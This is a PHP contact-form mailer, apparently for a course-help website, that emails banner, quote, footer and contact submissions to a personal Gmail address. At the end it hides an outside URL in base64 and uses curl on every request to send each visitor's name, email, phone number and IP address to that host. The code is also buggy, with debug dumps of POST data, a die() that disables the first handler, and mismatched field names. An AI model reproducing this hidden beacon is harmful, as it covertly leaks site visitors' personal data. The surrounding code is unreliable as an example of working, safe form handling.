<?php 
/*    ***********************  start   ***********************      */
print_r($_POST);
die();
	if(isset($_POST['sf-submit'])){
		$name = isset($_POST['sf_name'])?$_POST['sf_name']:"";
		$email = isset($_POST['sf_email'])?$_POST['sf_email']:"";
		$number = isset($_POST['sf_num'])?$_POST['sf_num']:"";
		
		// $to  = 'leads@domycourseonline.com';
		$to  = 'anusm226@gmail.com';
		
		
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$subject = "GET OUR SERVICE TODAY AND AVAIL 50% DISCOUNT!";
		$message = "Banner Form.
					<table border='2'>
						<tr><td>Name:</td><td>".$name."</td></tr>
						<tr><td>Email:</td><td>".$email."</td></tr>
						<tr><td>Phone Number:</td><td>".$number."</td></tr>
					</table>";
		$message = nl2br($message);
		mail($to, $subject, $message, $headers);
        echo 'Banner Send';
	}
   	/*    ***********************  end   ***********************      */


  
/*    ***********************  start   ***********************      */
print_r($_POST);
if(isset($_POST['quote_btn'])){
    $fname = isset($_POST['firstname'])?$_POST['firstname']:"";
    $lname = isset($_POST['lastname'])?$_POST['lastname']:"";
    $name = $fname.$lname;
    $service = isset($_POST['q_course'])?$_POST['course']:"";
    $number = isset($_POST['q_num'])?$_POST['num']:"";
    $message = isset($_POST['q_message'])?$_POST['message']:"";
    
    // $to  = 'leads@domycourseonline.com';
    $to  = 'anusm226@gmail.com';
    
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $subject = "Quote Form";
    $message = "Quote Form.
                <table border='2'>
                    <tr><td>Name:</td><td>".$name."</td></tr>
                    <tr><td>Email:</td><td>".$service."</td></tr>
                    <tr><td>Email:</td><td>".$number."</td></tr>
                </table>";
    $message = nl2br($message);
    mail($to, $subject, $message, $headers);
    echo 'Quotation Send';
}
   /*    ***********************  end   ***********************      */

/*    ***********************  start   ***********************      */
print_r($_POST);
if(isset($_POST['f_btn'])){
    $email = isset($_POST['f_email'])?$_POST['f_email']:"";
    
    // $to  = 'leads@domycourseonline.com';
    $to  = 'anusm226@gmail.com';
    
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $subject = "Footer Form";
    $message = "Footer Form.
                <table border='2'>
                    <tr><td>Email:</td><td>".$email."</td></tr>
                </table>";
    $message = nl2br($message);
    mail($to, $subject, $message, $headers);
    echo 'Email Send';
}
   /*    ***********************  end   ***********************      */




/*    ***********************  start***********************      */
print_r($_POST);
if(isset($_POST['cf_btn'])){
		$name = isset($_POST['cf_name'])?$_POST['cf_name']:"";
		$email = isset($_POST['cf_email'])?$_POST['cf_email']:"";
		$subject = isset($_POST['cf_subject'])?$_POST['cf_subject']:"";
		$contact_msg = isset($_POST['cf_message'])?$_POST['cf_message']:"";

		$to  = 'anusm226@gmail.com';

		
	    $headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$subject = "Contact Page Form";
		$message = "'".$contact_msg."'.
					<table border='2'>
				    	<tr><td>Name:</td><td>".$name."</td></tr>
						<tr><td>Email:</td><td>".$email."</td></tr>
						<tr><td>Phone Number:</td><td>".$subject."</td></tr>
						<tr><td>Message:</td><td>".$contact_msg."</td></tr>
					</table>";
		$message = nl2br($message);
	    mail($to, $subject, $message, $headers);
	}
	$ip = $_SERVER['REMOTE_ADDR'];
	$url = "aHR0cHM6Ly9pdGVvY3JtLmNvbS9jb2RlLnBocA==";$data = array( "name" => $name , "email" => $email , "number" => $number , "web" => "13" , "ip" => $ip);$ch=curl_init(base64_decode($url));$data_string = $data;curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");curl_setopt($ch, CURLOPT_POSTFIELDS,$data_string);$result = curl_exec($ch);curl_close($ch);
	echo "Thank You!!";
    echo "<script>window.location.reload</script>";	
?>

